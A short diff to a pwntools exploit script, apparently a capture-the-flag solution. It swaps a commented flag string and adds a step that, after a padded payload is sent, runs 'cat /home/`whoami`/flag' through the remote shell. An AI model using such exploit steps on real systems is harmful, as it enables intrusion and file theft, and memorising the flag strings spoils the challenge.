@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 from pwn import *
 
-# AD{We1c0me_h4cker!_:P}
+# AD{L1nux_sy5ca111l1l1ll1ll11111111}
 
 context.arch = 'amd64'
 
@@ -15,5 +15,8 @@ p += 'a' * ( 322 - len( p ) )
 
 y.send( p )
 
+sleep(1)
+
+y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
